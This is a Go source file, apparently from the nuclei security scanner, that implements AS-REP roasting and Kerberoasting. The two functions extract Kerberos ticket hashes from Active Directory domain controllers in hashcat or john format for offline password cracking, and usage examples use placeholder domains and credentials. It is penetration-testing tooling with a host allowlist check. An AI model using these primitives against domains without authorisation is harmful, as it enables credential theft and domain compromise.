// Package krbroast exposes the two unauthenticated/low-privilege Kerberos
// hash-extraction primitives used by every AD red-team workflow:
//
//   - AS-REP roasting (no creds required, only a username with the
//     DONT_REQ_PREAUTH UAC flag set)
//   - Kerberoasting   (any valid domain credential plus a target SPN)
//
// Both functions return the captured ticket material formatted for offline
// cracking with hashcat / john so a template can chain enumeration (via
// nuclei/ldap GetADUserKerberoastable / GetADUserAsRepRoastable) directly
// into hash extraction.
package krbroast

import (
	"fmt"

	gpkrb "github.com/Mzack9999/goimpacket/pkg/kerberos"
	"github.com/Mzack9999/goja"

	"github.com/projectdiscovery/nuclei/v3/pkg/js/libs/dcerpc"
	"github.com/projectdiscovery/nuclei/v3/pkg/js/utils"
	"github.com/projectdiscovery/nuclei/v3/pkg/protocols/common/protocolstate"
)

// ASRepRoastRequest configures an AS-REP roast attempt.
type ASRepRoastRequest struct {
	Username string `json:"username"`
	Domain   string `json:"domain"`
	KDCHost  string `json:"kdc_host"`
	Format   string `json:"format,omitempty"` // "hashcat" (default) or "john"
}

// ASRepRoast asks the KDC for the AS-REP of a user that has DONT_REQ_PREAUTH
// set. No credentials are required. Returns the cracking-format string or
// throws if the user requires pre-auth or does not exist.
//
// Implemented as a goja-native function so the calling runtime's executionId
// can be captured and bound into the *transport.Dialer routed to the KDC.
//
// @example
// ```javascript
// const krb = require('nuclei/krbroast');
//
//	const hash = krb.ASRepRoast({
//	  Username: 'svc_jenkins',
//	  Domain:   'acme.local',
//	  KDCHost:  'dc01.acme.local',
//	});
//
// log(hash);
// ```
func ASRepRoast(call goja.FunctionCall, vm *goja.Runtime) goja.Value {
	nj := utils.NewNucleiJS(vm)
	nj.ObjectSig = "ASRepRoast(request)"

	var req ASRepRoastRequest
	if err := vm.ExportTo(call.Argument(0), &req); err != nil {
		nj.ThrowError(fmt.Errorf("invalid ASRepRoastRequest: %w", err))
	}
	if req.Username == "" || req.Domain == "" || req.KDCHost == "" {
		nj.ThrowError(fmt.Errorf("Username, Domain and KDCHost are required")) //nolint
	}

	execID := nj.ExecutionId()
	if execID == "" {
		nj.ThrowError(fmt.Errorf("krbroast: no executionId on goja runtime"))
	}
	if !protocolstate.IsHostAllowed(execID, req.KDCHost) {
		nj.ThrowError(protocolstate.ErrHostDenied.Msgf(req.KDCHost))
	}

	hash, err := gpkrb.GetASREPWithDialer(dcerpc.NewExecDialer(execID), req.Username, req.Domain, req.KDCHost, req.Format)
	if err != nil {
		nj.ThrowError(err)
	}
	return vm.ToValue(hash)
}

// KerberoastRequest configures a Kerberoast attempt.
//
// One of Password / NTHash must be set. SPN is the service principal name to
// roast (e.g. "MSSQLSvc/sql01.acme.local:1433"). TargetUser, when set, is the
// account name embedded in the resulting hash string (defaults to Username).
type KerberoastRequest struct {
	Username   string `json:"username"`
	Password   string `json:"password,omitempty"`
	NTHash     string `json:"nthash,omitempty"`
	Domain     string `json:"domain"`
	KDCHost    string `json:"kdc_host"`
	SPN        string `json:"spn"`
	TargetUser string `json:"target_user,omitempty"`
}

// KerberoastResult is the cracking-format hash plus a few useful fields for
// post-processing by templates.
type KerberoastResult struct {
	Username string `json:"username"`
	SPN      string `json:"spn"`
	Hash     string `json:"hash"`
	EType    int32  `json:"enc_type"`
}

// Kerberoast requests a TGS for the given SPN using the supplied credentials
// and returns its hashcat-formatted hash for offline cracking.
//
// Note: the underlying jcmturner/gokrb5 client used by GetTGSWithOptions
// performs its own net.Dial that is not routed through nuclei's fastdialer.
// The host is still pre-validated against the per-execution network policy so
// allowlist / denylist constraints are enforced before any traffic is sent.
//
// @example
// ```javascript
// const krb = require('nuclei/krbroast');
//
//	const r = krb.Kerberoast({
//	  Username:   'lowpriv',
//	  Password:   'P@ss',
//	  Domain:     'acme.local',
//	  KDCHost:    'dc01.acme.local',
//	  SPN:        'MSSQLSvc/sql01.acme.local:1433',
//	  TargetUser: 'svc_sql',
//	});
//
// log(r.Hash);
// ```
func Kerberoast(call goja.FunctionCall, vm *goja.Runtime) goja.Value {
	nj := utils.NewNucleiJS(vm)
	nj.ObjectSig = "Kerberoast(request)"

	var req KerberoastRequest
	if err := vm.ExportTo(call.Argument(0), &req); err != nil {
		nj.ThrowError(fmt.Errorf("invalid KerberoastRequest: %w", err))
	}
	if req.Username == "" || req.Domain == "" || req.KDCHost == "" || req.SPN == "" {
		nj.ThrowError(fmt.Errorf("Username, Domain, KDCHost and SPN are required")) //nolint
	}
	if req.Password == "" && req.NTHash == "" {
		nj.ThrowError(fmt.Errorf("either Password or NTHash must be supplied"))
	}

	execID := nj.ExecutionId()
	if execID == "" {
		nj.ThrowError(fmt.Errorf("krbroast: no executionId on goja runtime"))
	}
	if !protocolstate.IsHostAllowed(execID, req.KDCHost) {
		nj.ThrowError(protocolstate.ErrHostDenied.Msgf(req.KDCHost))
	}

	target := req.TargetUser
	if target == "" {
		target = req.Username
	}
	res, err := gpkrb.GetTGSWithOptions(gpkrb.TGSOptions{
		Username:   req.Username,
		Password:   req.Password,
		NTHash:     req.NTHash,
		Domain:     req.Domain,
		KDCHost:    req.KDCHost,
		TargetUser: target,
		SPN:        req.SPN,
	})
	if err != nil {
		nj.ThrowError(err)
	}
	return vm.ToValue(&KerberoastResult{
		Username: res.Username,
		SPN:      res.SPN,
		Hash:     res.Hash,
		EType:    res.EType,
	})
}
